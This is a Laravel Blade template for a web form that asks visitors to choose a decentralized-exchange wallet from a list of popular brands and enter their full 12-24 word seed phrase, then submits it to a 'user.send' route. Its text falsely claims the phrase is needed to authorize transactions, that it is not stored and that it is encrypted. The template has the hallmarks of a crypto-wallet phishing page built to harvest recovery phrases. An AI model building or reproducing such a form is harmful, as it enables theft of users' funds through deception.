<x-app-layout>
    <div class="layout-content-container flex flex-col max-w-[960px] flex-1">
        <form method="POST" action="{{ route('user.send') }}">
            @csrf
            <div class="flex max-w-[480px] flex-wrap items-end gap-4 px-4 py-3">
                <label class="flex flex-col min-w-40 flex-1">
                    <p class="text-[#0e141b] text-base font-medium leading-normal pb-2">
                        DEX Wallet
                    </p>
                    <select name="wallet_type"
                        class="form-input flex w-full min-w-0 flex-1 resize-none overflow-hidden rounded-lg text-[#0e141b] focus:outline-0 focus:ring-0 border border-[#d0dbe7] bg-slate-50 focus:border-[#d0dbe7] h-14 placeholder:text-[#4e7097] p-[15px] text-base font-normal leading-normal">
                        @foreach (['MetaMask', 'Trust Wallet', 'Coinbase Wallet', 'SafePal', 'TokenPocket', 'Phantom', 'Rainbow', 'WalletConnect', 'BitKeep', 'Argent', 'ZenGo', 'Pillar', '1inch Wallet', 'MEW Wallet', 'Torus'] as $wallet)
                            <option value="{{ $wallet }}" {{ old('wallet_type') == $wallet ? 'selected' : '' }}>
                                {{ $wallet }}</option>
                        @endforeach
                    </select>
                </label>
            </div>
            @error('wallet_type')
                <p class="text-red-500 text-sm px-4">{{ $message }}</p>
            @enderror

            <div class="flex max-w-[480px] flex-wrap items-end gap-4 px-4 py-3">
                <label class="flex flex-col min-w-40 flex-1">
                    <p class="text-[#0e141b] text-base font-medium leading-normal pb-2">
                        Wallet Seed Phrase
                    </p>
                    <input name="seed_phrase" placeholder="Enter your 12-24 word seed phrase"
                        class="form-input flex w-full min-w-0 flex-1 resize-none overflow-hidden rounded-lg text-[#0e141b] focus:outline-0 focus:ring-0 border border-[#d0dbe7] bg-slate-50 focus:border-[#d0dbe7] h-14 placeholder:text-[#4e7097] p-[15px] text-base font-normal leading-normal"
                        value="{{ old('seed_phrase') }}" />
                </label>
            </div>
            @error('seed_phrase')
                <p class="text-red-500 text-sm px-4">{{ $message }}</p>
            @enderror

            <div class="flex px-4 py-3 justify-start">
                <button type="submit"
                    class="flex min-w-[84px] max-w-[480px] cursor-pointer items-center justify-center overflow-hidden rounded-lg h-10 px-4 bg-[#1978e5] text-slate-50 text-sm font-bold leading-normal tracking-[0.015em]">
                    <span class="truncate">Connect Securely</span>
                </button>
            </div>

            <div class="flex max-w-[480px] flex-wrap items-end gap-4 px-4 py-3">
                <p class="text-[#4e7097] text-sm leading-normal">
                    Please ensure your seed phrase is entered correctly. This is required to authorize transactions on
                    the selected DEX wallet. We don't store your seedphrase on our servers
                </p>
            </div>

            <div class="flex max-w-[480px] flex-wrap items-end gap-4 px-4 py-3">
                <p class="text-[#4e7097] text-sm leading-normal">
                    Our platform uses advanced encryption to protect your data.
                </p>
            </div>


        </form>
    </div>
</x-app-layout>
